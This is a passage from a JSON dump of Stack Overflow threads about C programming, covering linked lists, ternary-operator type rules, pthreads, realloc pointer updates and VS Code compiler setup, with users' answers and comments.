false, "score": 0, "creation_date": 1518634302, "post_id": 48793537, "comment_id": 84590677, "body": "OT: <code>struct Node *temp = malloc(sizeof(struct Node));</code> alternative: <code>struct Node *temp = malloc(sizeof *temp);</code>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518634414, "post_id": 48793537, "comment_id": 84590734, "body": "Note that <code>temp</code> leaks memory if <code>current-&gt;data == data</code> is never true and potentially worse, it repeats if <code>current-&gt;data == data</code> is true more than once."}], "tags": [], "owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "is_accepted": true, "score": 2, "last_activity_date": 1518883528, "last_edit_date": 1518883528, "creation_date": 1518631347, "answer_id": 48793537, "question_id": 48793113, "link": "https://stackoverflow.com/questions/48793113/c-pointer-getting-the-null-list/48793537#48793537", "title": "C pointer. Getting the null list", "body": "<p>You probably want this:</p>\n\n<pre><code>insertAfter(struct Node *head){\n    struct Node *temp = malloc(sizeof(struct Node)); // one line is enough \n                                                     // and casting is useless.    \n    int data, insert;\n    scanf(\"%d\", &amp;data);\n    scanf(\"%d\", &amp;insert);\n\n    struct Node *current = head;                     // head stays at head of list\n\n    while (current != NULL){\n        if (current-&gt;data == data){\n            temp-&gt;data = insert;\n            temp-&gt;next = n-&gt;next;\n            current-&gt;next = temp;\n            printf(\"data matched\\n\");\n        }\n        current = current-&gt;next;\n    }\n\n    printList(head);\n}\n</code></pre>\n\n<p>The <code>printList</code>  function seems correct though it is odd that you print the newline beforehead, I'd use this: <code>\"%d\\n\"</code> instead of this: <code>\"\\n %d\"</code>.</p>\n\n<p>Disclaimer: this is untested code. All comments are mine.</p>\n\n<p>BTW: it is bad design to do the input inside the <code>insertAfter</code> function. The signature of this function should be:</p>\n\n<pre><code>insertAfter(struct Node *head, int data, int insert);\n</code></pre>\n\n<p>and the <code>scanf</code> calls should be done before you call <code>insertAfter</code>:</p>\n\n<pre><code>scanf(\"%d\", &amp;data); //value in the linked list\nscanf(\"%d\", &amp;insert); // data to be inserted \ninsertAfter(head, data, insert);\n</code></pre>\n"}], "owner": {"reputation": 161, "user_id": 6194909, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh6.googleusercontent.com/-4I667VTlmAI/AAAAAAAAAAI/AAAAAAAABeA/AfpTaBCyGRw/photo.jpg?sz=128", "display_name": "Hank", "link": "https://stackoverflow.com/users/6194909/hank"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "accepted_answer_id": 48793537, "answer_count": 1, "score": 0, "last_activity_date": 1518883528, "creation_date": 1518629680, "last_edit_date": 1518630887, "question_id": 48793113, "link": "https://stackoverflow.com/questions/48793113/c-pointer-getting-the-null-list", "title": "C pointer. Getting the null list", "body": "<p>Below Code for inserting data after a specified node. When I do a print*** of the node I am getting the null list. </p>\n\n<p>Also, pls suggest some other I/O method.</p>\n\n<p>head: 1 2 3 4 (linked list with four values)</p>\n\n<p>Inserting the data:</p>\n\n<pre><code>insertAfter(struct Node *head){\n    int data, insert;\n    struct Node *temp = NULL;\n    temp = (struct Node *)malloc(sizeof(struct Node));\n\n    scanf(\"%d\", &amp;data); //value in the linked list\n    scanf(\"%d\", &amp;insert); // data to be inserted \n\n    while (head != NULL){\n        if (head-&gt;data == data){\n            temp-&gt;data = insert;\n            temp-&gt;next = n-&gt;next;\n            head-&gt;next = temp;\n            printf(\"data matched \\n\");\n       }\n       head = head-&gt;next;\n    }\n    printList(head); //print*** of the node\n}\n</code></pre>\n\n<p>Printing the linkedList:</p>\n\n<pre><code> void printList(struct Node *head){\n     while (head != NULL){\n     printf(\"\\n %d\", head-&gt;data);\n     head = head-&gt;next;\n   }\n}\n</code></pre>\n\n<p>Any help would be appreciated.</p>\n"}, {"tags": ["c", "visual-studio", "ternary-operator"], "answers": [{"comments": [{"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 1, "creation_date": 1518638405, "post_id": 48793219, "comment_id": 84592860, "body": "I get it. Although my intention is that the result of either branch of the ternary expression will be tested for zero, the result of both branches must be the same type. By explicitly writing the test (second example), they have now become both boolean expressions and so are compatible."}], "tags": [], "owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "is_accepted": true, "score": 3, "last_activity_date": 1518631365, "last_edit_date": 1518631365, "creation_date": 1518630076, "answer_id": 48793219, "question_id": 48793075, "link": "https://stackoverflow.com/questions/48793075/invalid-parse-of-ternary-expression-vc2008/48793219#48793219", "title": "Invalid parse of ternary expression VC2008?", "body": "<p>It's a constraint violation, simply put. To begin with, the type of an assignment expression is determined by the left hand side. So your case sees <code>struct XTYPE*</code> and <code>struct YTYPE*</code>.</p>\n\n<p><a href=\"https://port70.net/~nsz/c/c11/n1570.html#6.5.16p3\" rel=\"nofollow noreferrer\">6.5.16 Assignment operators - p3</a></p>\n\n<blockquote>\n  <p>An assignment operator stores a value in the object designated by the\n  left operand. An assignment expression has the value of the left\n  operand after the assignment,111) but is not an lvalue. <strong>The type of an\n  assignment expression is the type the left operand would have after\n  lvalue conversion.</strong> The side effect of updating the stored value of the\n  left operand is sequenced after the value computations of the left and\n  right operands. The evaluations of the operands are unsequenced.</p>\n</blockquote>\n\n<p>And the types of the operands for a conditional expression must satisfy this constraint:</p>\n\n<p><a href=\"https://port70.net/~nsz/c/c11/n1570.html#6.5.15p3\" rel=\"nofollow noreferrer\">6.5.15 Conditional operator - p3</a></p>\n\n<blockquote>\n  <p>One of the following shall hold for the second and third operands:</p>\n  \n  <ul>\n  <li>both operands have arithmetic type;</li>\n  <li>both operands have the same structure or union type;</li>\n  <li>both operands have void type;</li>\n  <li>both operands are pointers to qualified or unqualified versions of compatible types;</li>\n  <li>one operand is a pointer and the other is a null pointer constant; or</li>\n  <li>one operand is a pointer to an object type and the other is a pointer to a qualified or unqualified version of void.</li>\n  </ul>\n</blockquote>\n\n<p>Since <code>struct XTYPE*</code> and <code>struct YTYPE*</code> are not pointers to compatible types (the only bullet which <em>may</em> even apply), and are in fact just pointers to unrelated types, your program is ill-formed.</p>\n\n<hr>\n\n<p><sub>\nA major point of contention here is that MSVC isn't a conforming C compiler (not C11 anyway). But the above rules haven't changed much since the last C version that MSVC <em>does</em> support, so there you have it.\n</sub></p>\n"}, {"tags": [], "owner": {"reputation": 4732, "user_id": 8477999, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f8172e1919af53269de92316dcf03a03?s=128&d=identicon&r=PG&f=1", "display_name": "Gem Taylor", "link": "https://stackoverflow.com/users/8477999/gem-taylor"}, "is_accepted": false, "score": 0, "last_activity_date": 1518633926, "creation_date": 1518633926, "answer_id": 48794179, "question_id": 48793075, "link": "https://stackoverflow.com/questions/48793075/invalid-parse-of-ternary-expression-vc2008/48794179#48794179", "title": "Invalid parse of ternary expression VC2008?", "body": "<p>Although you aren't using it, the compiler has to make a sensible type for the result of the tertiary operation by looking at the two RHS paths.\nIn the first case you gave it 2 unrelated pointer types X and Y, which it refuses to resolve directly to bool for the if statement. (bool doesn't exist as a specific type in C, so it would need to use some int type)</p>\n\n<p>In the second case you have done this cast to bool, by comparing with 0/NULL/nullptr, though you have switched the logic from <code>if set</code> to <code>if clear</code>.</p>\n\n<p>In c++ we have the concept of inheritance and related types, so the compiler can often find a common type to resolve these sorts of statements. In my experience different compilers have treated this situation differently, but with strict compliance settings it should always fail unless one of the operands is a subtype of the other.</p>\n\n<p>One way I used to fix these issues in the old days was to use \"double-pling\" !! as a cast to boolean keeping the original sense:</p>\n\n<pre><code> if (b ? !!(pX= (*pfFoo)())\n       : !!(pY= (*pfFoo)()) )\n {\n    ;\n }\n</code></pre>\n\n<p>The point of the double-pling is that it can be read as a single operation with a clear intent, while anything else has to be decoded by the reader. </p>\n"}], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 48793219, "answer_count": 2, "score": 2, "last_activity_date": 1536941389, "creation_date": 1518629562, "last_edit_date": 1536941389, "question_id": 48793075, "link": "https://stackoverflow.com/questions/48793075/invalid-parse-of-ternary-expression-vc2008", "title": "Invalid parse of ternary expression VC2008?", "body": "<p>The following code gives me a compiler warning</p>\n\n<pre><code>warning C4133: ':' : incompatible types - from 'YTYPE *' to 'XTYPE *'\n</code></pre>\n\n<p>however, the expession seems OK to me. Any ideas?</p>\n\n<pre><code>struct XTYPE {\n    int x;\n    long y;\n};\nstruct YTYPE {\n    long y;\n    int x;\n};\n\nextern void *getSomething(void);\n\nvoid Test(void)\n{\n    int b= 0;\n    struct XTYPE *pX;\n    struct YTYPE *pY;\n\n    void * (*pfFoo)(void);\n\n    pfFoo= getSomething;\n\n    if (b ? (pX= (*pfFoo)())       // error\n          : (pY= (*pfFoo)()) )\n    {\n        ;\n    }\n    if (b ? ((pX= (*pfFoo)())!=0)  // no error\n          : ((pY= (*pfFoo)())!=0) )\n    {\n        ;\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "multithreading", "concurrency"], "comments": [{"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1518630417, "post_id": 48793074, "comment_id": 84588686, "body": "You should absolutely read some <a href=\"https://computing.llnl.gov/tutorials/pthreads/\" rel=\"nofollow noreferrer\">pthread tutorial</a>"}, {"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "edited": false, "score": 0, "creation_date": 1518690426, "post_id": 48793074, "comment_id": 84612566, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/1052818/create-a-pointer-to-two-dimensional-array\">Create a pointer to two-dimensional array</a>"}], "answers": [{"tags": [], "owner": {"reputation": 55059, "user_id": 212858, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1166c87b6f3fc2e6746da96b60fefb46?s=128&d=identicon&r=PG", "display_name": "Useless", "link": "https://stackoverflow.com/users/212858/useless"}, "is_accepted": true, "score": 2, "last_activity_date": 1518640808, "last_edit_date": 1518640808, "creation_date": 1518630308, "answer_id": 48793276, "question_id": 48793074, "link": "https://stackoverflow.com/questions/48793074/how-can-you-dereference-and-use-a-matrix-you-passed-to-a-posix-thread-in-c/48793276#48793276", "title": "How can you dereference and use a matrix you passed to a POSIX thread in C?", "body": "<pre><code>int i = 10;\nint j = 10;\n\nint var = 0;\nint w,x;\n</code></pre>\n\n<p>Globals: just say no.</p>\n\n<p>They're not generally a great idea in single-threaded programs, but using mutable globals (which start off uninitialized) in multiple threads is ... risky.</p>\n\n<pre><code>void * fillcell(void * param) {\n    int** value = (int**) param;\n    value[x][w]= x*w;\n</code></pre>\n\n<p>your program has a single variable <code>x</code>, and a single variable <code>w</code>. They're shared between all threads. Creating a thread doesn't create a snapshot of all global variables for the new thread's use, they're all just shared. There is absolutely no way to know, in this program, what values of <code>x</code> and <code>w</code> a given thread will see in this function.</p>\n\n<p>You can fix this by passing an explicit <code>{x, w, A}</code> parameter structure to each thread - and I mean a <em>different</em> instance of that structure for each thread.</p>\n\n<p>Finally, <code>int A[10][10]</code> is <em>not</em> an <code>int**</code>, and it doesn't decay to one. To prove this, just print the address of each <code>A[x][w]</code> and then print the address of each <code>value[x][w]</code>. See how your 2D array is really laid out. Printing all your addresses will also make it easy to understand the address valgrind is complaining about.</p>\n"}], "owner": {"reputation": 372, "user_id": 8954282, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd79f5628fe7acc3d43ee9cdcee5da1d?s=128&d=identicon&r=PG&f=1", "display_name": "S.D", "link": "https://stackoverflow.com/users/8954282/s-d"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "accepted_answer_id": 48793276, "answer_count": 1, "score": -1, "last_activity_date": 1518640808, "creation_date": 1518629561, "question_id": 48793074, "link": "https://stackoverflow.com/questions/48793074/how-can-you-dereference-and-use-a-matrix-you-passed-to-a-posix-thread-in-c", "title": "How can you dereference and use a matrix you passed to a POSIX thread in C?", "body": "<p>For each cell, I want to create a thread that will multiply its current row number by its current column number. The problem is that I don't know how to properly dereference the matrix and use it. Valgrind says that there is an uninitialized value of size 8 used in fillcell. Since it's size 8 I suspect it is the pointer. I am just stuck trying to properly convert it and would really appreciate any help. Thanks in advanced.</p>\n\n<pre><code>#include &lt;pthread.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;unistd.h&gt;\n\n#include \"myutils.h\"\nint i = 10;\nint j = 10;\n\nint var = 0;\nint w,x;\n\n\nvoid * fillcell(void * param){\n\n    int** value = (int**) param;\n\n    value[x][w]= x*w;\n\n    printf(\"%d \\n\",w*x);\n\n\n}\n\n\nint main(int argc, char * argv[])\n{\n    pthread_t * tid;\n    tid = malloc(i*j*sizeof(pthread_t));\n\n    int A[i][j];\n\n    for ( x = 0; x &lt; i; x++){\n        for( w = 0; w &lt; j; w++){\n\n            pthread_create(&amp;tid[var],NULL , fillcell,&amp;A);\n            pthread_join(tid[var],NULL);  \n            var++:\n        }\n    }\n\n    free(tid);\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 3, "creation_date": 1518629613, "post_id": 48793028, "comment_id": 84588271, "body": "It is because the reallocated memory might not be simply extended, but the whole thing reallocated in a different part of memory. So the position pointers must be updated."}, {"owner": {"reputation": 339, "user_id": 4622572, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/e95a7d6b686afaf041c125e8be1e412f?s=128&d=identicon&r=PG&f=1", "display_name": "nikhil chaubey", "link": "https://stackoverflow.com/users/4622572/nikhil-chaubey"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518629761, "post_id": 48793028, "comment_id": 84588346, "body": "but newBuffer will always point to same place, I mean to the location where buffer was. Isn&#39;t it? I printed the values of newBuffer and buffer and they are always the same."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1518629803, "post_id": 48793028, "comment_id": 84588372, "body": "Suppose you have other uses for allocated memory: you <code>malloc</code> some memory for your example, and    <code>malloc</code> some more for another purpose in the program - which happens to be contiguous with the first allocation. Can you see there is a problem reallocating the first memory block? The purpose of the pointer arithmetic here, is to ensure that <code>currentPosition </code> points to the correct place."}, {"owner": {"reputation": 339, "user_id": 4622572, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/e95a7d6b686afaf041c125e8be1e412f?s=128&d=identicon&r=PG&f=1", "display_name": "nikhil chaubey", "link": "https://stackoverflow.com/users/4622572/nikhil-chaubey"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518629910, "post_id": 48793028, "comment_id": 84588422, "body": "Ohh. yes in that case it can&#39;t point to same place. Must try myself."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518630074, "post_id": 48793028, "comment_id": 84588507, "body": "Aside <code>const size_t sizeIncrement = 10;</code> is mean - you could easily go for <code>100</code> or <code>1000</code> on a modern machine which would put less stress on the reallocation system."}, {"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1518630398, "post_id": 48793028, "comment_id": 84588675, "body": "The pointer arithmetic using pointers that are no longer guaranteed valid, much less part of the same sequence (they were, but are they <i>now</i>?), is questionable in itself. That is easily rectified, and makes the code easier to read in the process."}, {"owner": {"reputation": 339, "user_id": 4622572, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/e95a7d6b686afaf041c125e8be1e412f?s=128&d=identicon&r=PG&f=1", "display_name": "nikhil chaubey", "link": "https://stackoverflow.com/users/4622572/nikhil-chaubey"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1518630507, "post_id": 48793028, "comment_id": 84588724, "body": "@WeatherVane yes you are right. I tried and it does not work without having this condition. newbuffer and buffer are not same too.Same is explained in the book but not that easy to have foresight what exactly is the case he is talking."}], "answers": [{"tags": [], "owner": {"reputation": 13530, "user_id": 593382, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/f7326fd554e09edf21ca727d6854e22e?s=128&d=identicon&r=PG", "display_name": "Grady Player", "link": "https://stackoverflow.com/users/593382/grady-player"}, "is_accepted": true, "score": 2, "last_activity_date": 1518631781, "creation_date": 1518631781, "answer_id": 48793656, "question_id": 48793028, "link": "https://stackoverflow.com/questions/48793028/resizing-the-array-code-from-a-book-in-c/48793656#48793656", "title": "Resizing the array, code from a book in C", "body": "<p><code>currentPosition = newBuffer + (currentPosition - buffer);</code></p>\n\n<p>so <code>(currentPosition - buffer)</code> is the offset (position - starting = offset)</p>\n\n<p>after a realloc, the old pointer may or may not be good, it is UB... so you always need to use the new returned pointer... but the contents are copied. so it is like a new bigger buffer and you need to update your current position to the same offset in the new buffer ... so</p>\n\n<p><code>currentPosition = newBuffer + (currentPosition - buffer);</code></p>\n\n<p>makes perfect sense...</p>\n"}], "owner": {"reputation": 339, "user_id": 4622572, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/e95a7d6b686afaf041c125e8be1e412f?s=128&d=identicon&r=PG&f=1", "display_name": "nikhil chaubey", "link": "https://stackoverflow.com/users/4622572/nikhil-chaubey"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 1, "accepted_answer_id": 48793656, "answer_count": 1, "score": 2, "last_activity_date": 1518633030, "creation_date": 1518629378, "last_edit_date": 1518629820, "question_id": 48793028, "link": "https://stackoverflow.com/questions/48793028/resizing-the-array-code-from-a-book-in-c", "title": "Resizing the array, code from a book in C", "body": "<p>I am currently trying to understand pointers from this book,<br>\n<a href=\"http://shop.oreilly.com/product/0636920028000.do\" rel=\"nofollow noreferrer\">http://shop.oreilly.com/product/0636920028000.do</a></p>\n\n<p>In chapter <strong>Pointers and arrays</strong>, under this heading <strong>Using the realloc Function to Resize an Array</strong> <strong>page 87</strong> author has given a snippet for how to resize array, if we don't know how many characters are going to be entered.</p>\n\n<pre><code>    /*read in characters\n    from standard input and assign them to a buffer. The buffer will contain all of the\n    characters read in except for a terminating return character\n    */\n    #include &lt;stdio.h&gt;\n    #include &lt;stdlib.h&gt;\n\n    char* getLine(void) \n    {\n        const size_t sizeIncrement = 10;\n        char* buffer = malloc(sizeIncrement);\n        char* currentPosition = buffer;\n        size_t maximumLength = sizeIncrement;\n        size_t length = 0;\n        int character;\n\n        if(currentPosition == NULL) \n            { \n                return NULL; \n            }\n\n        while(1) \n            {\n                character = fgetc(stdin);\n                if(character == '\\n') \n                    { \n                        break; \n                    }\n\n                if(++length &gt;= maximumLength) \n                    {\n                        char *newBuffer = realloc(buffer, maximumLength += sizeIncrement);\n                        if(newBuffer == NULL) \n                            {\n                                free(buffer);\n                                return NULL;\n                            }\n                        currentPosition = newBuffer + (currentPosition - buffer);//what is the purpose of this??\n                        buffer = newBuffer;\n                    } \n                *currentPosition++ = character;\n        }//while\n\n        *currentPosition = '\\0';\n        return buffer;\n    }\n\n    int main(void)\n    {\n        char *s = getLine();\n        printf(\"%s\\n\", s);\n        return 0;\n    }\n</code></pre>\n\n<p>I commented this part of the code</p>\n\n<pre><code>currentPosition = newBuffer + (currentPosition - buffer);\n</code></pre>\n\n<p>and ran the code. It still worked.\nI am not sure, what purpose that line of code is for, becuase the evaluation for newBuffer and buffer will always cancel each other.</p>\n\n<p>Is something missing from my understanding? </p>\n\n<p>If not should I follow this book religiously?</p>\n"}, {"tags": ["c", "json", "windows", "visual-studio-code"], "comments": [{"owner": {"reputation": 610, "user_id": 8979940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmzYf.jpg?s=128&g=1", "display_name": "Omer Dagan", "link": "https://stackoverflow.com/users/8979940/omer-dagan"}, "edited": false, "score": 0, "creation_date": 1518633233, "post_id": 48792261, "comment_id": 84590103, "body": "not sure why this is tagged <code>c</code> but \\, my guess you need to use the full-path to g++ as it is probably noy\\t part of the PATH for the running environment"}], "answers": [{"tags": [], "owner": {"reputation": 91, "user_id": 8352044, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3eace6aedd0b4083c848d91fb28ed206?s=128&d=identicon&r=PG&f=1", "display_name": "varun teja-M.V.T", "link": "https://stackoverflow.com/users/8352044/varun-teja-m-v-t"}, "is_accepted": true, "score": 1, "last_activity_date": 1518698445, "last_edit_date": 1518698445, "creation_date": 1518696661, "answer_id": 48806978, "question_id": 48792261, "link": "https://stackoverflow.com/questions/48792261/the-prelaunchtask-helloworld-terminated-with-exit-code-1/48806978#48806978", "title": "The preLaunchTask &#39;helloworld&#39; terminated with exit code 1", "body": "<p>I have moved mingw-64 file from \"C:\\Program Files (x86)\" to 'Desktop' and i have specified the full path in tasks.json(i.e.,(\"command\":C:\\Users\\varunteja\\Desktop\\mingw-w64\\i686-7.2.0-win32-dwarf-rt_v5-rev1\\mingw32\\bin\\g++\",) instead of (\"command\": \"g++\",)).</p>\n\n<p>And also i have edited \"Launch.json\" file.\nIn Launch.json file i have edited( \"program\": \" C:/wamp/www/ShareIdea/helloworld.c/hello.exe\",) as ( \"program\": \" C:/wamp/www/ShareIdea/a.exe\",) where a.exe file was created when i start debugging.</p>\n\n<p>And also i have altered cwd  as (\"cwd\": \" C:/wamp/www/ShareIdea\",) which was the working directory of the target</p>\n"}], "owner": {"reputation": 91, "user_id": 8352044, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3eace6aedd0b4083c848d91fb28ed206?s=128&d=identicon&r=PG&f=1", "display_name": "varun teja-M.V.T", "link": "https://stackoverflow.com/users/8352044/varun-teja-m-v-t"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1972, "favorite_count": 1, "accepted_answer_id": 48806978, "answer_count": 1, "score": 2, "last_activity_date": 1518698445, "creation_date": 1518626879, "question_id": 48792261, "link": "https://stackoverflow.com/questions/48792261/the-prelaunchtask-helloworld-terminated-with-exit-code-1", "title": "The preLaunchTask &#39;helloworld&#39; terminated with exit code 1", "body": "<p>when i'm compiling my c file i'm getting the error</p>\n\n<p>(/\"\"Executing task: g++ -g helloworld.c &lt;</p>\n\n<p>'g++' is not recognized as an internal or external command,\noperable program or batch file.\nThe terminal process terminated with exit code: 1</p>\n\n<p>Terminal will be reused by tasks, press any key to close it.\"\"/)</p>\n\n<p>my launch.json file is</p>\n\n<pre><code>{\n// Use IntelliSense to learn about possible attributes.\n// Hover to view descriptions of existing attributes.\n// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387\n\"version\": \"0.2.0\",\n\"configurations\": [\n\n    {\n        \"name\": \"(gdb) Launch\",\n        \"type\": \"cppdbg\",\n        \"request\": \"launch\",\n        \"program\": \" C:/wamp/www/ShareIdea/helloworld.c/hello.exe\",\n        \"args\": [],\n        \"stopAtEntry\": false,\n        \"cwd\": \"${workspaceFolder}\",\n        \"environment\": [],\n        \"externalConsole\": true,\n        \"MIMode\": \"gdb\",\n        \"miDebuggerPath\": \"C:\\\\Program Files (x86)\\\\mingw-w64\\\\i686-7.2.0-posix-dwarf-rt_v5-rev1\\\\mingw32\\bin\\\\gdb.exe\",\n        \"setupCommands\": [\n            {\n                \"description\": \"Enable pretty-printing for gdb\",\n                \"text\": \"-enable-pretty-printing\",\n                \"ignoreFailures\": true\n            }\n        ],\n        \"preLaunchTask\": \"helloworld\"\n    }\n\n\n\n]\n}\n</code></pre>\n\n<p>And my \"tasks.json\" file is </p>\n\n<pre><code>{\n// See https://go.microsoft.com/fwlink/?LinkId=733558\n// for the documentation about the tasks.json format\n\"version\": \"2.0.0\",\n\"tasks\": [\n    {\n        \"label\": \"helloworld\",\n        \"type\": \"shell\",\n        \"command\": \"g++\",\n        \"args\": [\n            \"-g\",\n            \"helloworld.c\"\n        ]\n        }\n\n]\n}\n</code></pre>\n\n<p>and i have edited c_cpp_properties.json as</p>\n\n<pre><code>       {\n  \"configurations\": [\n      {\n        \"name\": \"Win32\",\n        \"includePath\": [\n            \"${workspaceFolder}\",\n            \"C:/Program Files (x86)/mingw-w64/i686-7.2.0-win32-dwarf-rt_v5-rev1/mingw32/lib/gcc/i686-w64-mingw32/7.2.0/include/c++/tr1\",\n            \"C:/Program Files (x86)/mingw-w64/i686-7.2.0-win32-dwarf-rt_v5-rev1/mingw32/lib/gcc/i686-w64-mingw32/7.2.0/include/c++\",\n            \"C:/Program Files (x86)/mingw-w64/i686-7.2.0-win32-dwarf-rt_v5-rev1/mingw32/i686-w64-mingw32/include\"\n        ],\n        \"defines\": [\n            \"_DEBUG\",\n            \"UNICODE\"\n        ],\n        \"intelliSenseMode\": \"msvc-x64\",\n        \"browse\": {\n            \"path\": [\n                \"${workspaceRoot}\",\n                \"C:\\\\Program Files (x86)\\\\mingw-w64\\\\i686-7.2.0-win32-dwarf-rt_v5-rev1\\\\mingw32\\\\lib\\\\gcc\\\\i686-w64-mingw32\\\\7.2.0\\\\include\\\\c++\",\n                \"C:\\\\Program Files (x86)\\\\mingw-w64\\\\i686-7.2.0-win32-dwarf-rt_v5-rev1\\\\mingw32\\\\lib\\\\gcc\\\\i686-w64-mingw32\\\\7.2.0\\\\include\\\\ssp\\\\stdio\",\n                \"C:\\\\Program Files (x86)\\\\mingw-w64\\\\i686-7.2.0-win32-dwarf-rt_v5-rev1\\\\mingw32\\\\i686-w64-mingw32\\\\include\"\n            ],\n            \"limitSymbolsToIncludedHeaders\": true,\n            \"databaseFilename\": \"\"\n        }\n    }\n],\n\"version\": 3\n }\n</code></pre>\n"}, {"tags": ["c", "pointers", "memory", "struct", "free"], "comments": [{"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 0, "creation_date": 1518625973, "post_id": 48791968, "comment_id": 84586094, "body": "<code>static Stack st;</code> followed by <code>st.signals = malloc()</code> is very bad, and easily a memory leak. Please ready and understand the meaning of <code>static</code> in the context you&#39;ve used it. It appears that you wanted to avoid <code>malloc()</code>ing and for that you did something that is very very wrong."}], "answers": [{"comments": [{"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 0, "creation_date": 1518626787, "post_id": 48792080, "comment_id": 84586625, "body": "Re. the statement &quot;Specially it&#39;s explicitly wrong to call free() on a pointer that is actually the result of 